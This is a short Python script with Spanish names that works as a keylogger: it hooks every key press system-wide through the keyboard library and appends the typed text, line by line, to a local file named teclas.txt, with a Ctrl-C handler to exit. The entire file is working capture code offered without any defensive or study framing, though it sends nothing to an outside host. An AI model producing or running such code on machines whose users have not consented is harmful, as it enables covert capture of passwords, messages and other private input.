import keyboard, signal, sys
from termcolor import colored

def def_handlerd(sig, frame):
    print(colored("saliendo....", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT,def_handlerd)

log_file="teclas.txt"
texto=""
shift=False

def teclas_pres(key):
    global texto
    if key.name=="enter":
        with open(log_file,"a")as f:
            f.write(f"{texto}+\n")
        texto=""
    elif key.name=="backspace":
        texto=texto[:-1]
    elif key.name=="space" or key.name=="alt" or key.name=="tab":
        texto+=" "
    else:
        texto+=key.name

def main():
    keyboard.on_press(teclas_pres)
    keyboard.wait()

if __name__=="__main__":
    main()